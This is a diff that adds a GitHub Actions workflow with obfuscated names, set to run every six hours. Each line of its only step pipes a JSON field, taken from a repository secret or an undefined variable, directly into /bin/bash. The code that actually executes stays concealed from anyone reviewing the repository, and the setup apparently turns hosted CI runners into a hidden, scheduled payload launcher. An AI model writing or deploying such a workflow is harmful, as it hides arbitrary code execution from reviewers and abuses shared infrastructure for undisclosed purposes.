@@ -1,0 +1,21 @@
+name: xiangyuhuanliu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangyuhuanliu
+        env:
+          ov7960: ${{ secrets.ov7960 }}
+        run: |
+          echo $ov7960 | jq -r .xp5 | /bin/bash
+          echo $ewoy63823 | jq -r .wbsnn4540 | /bin/bash
+          echo $lsdc0591 | jq -r .crty22 | /bin/bash
+          echo $u3 | jq -r .pbez7259 | /bin/bash
+
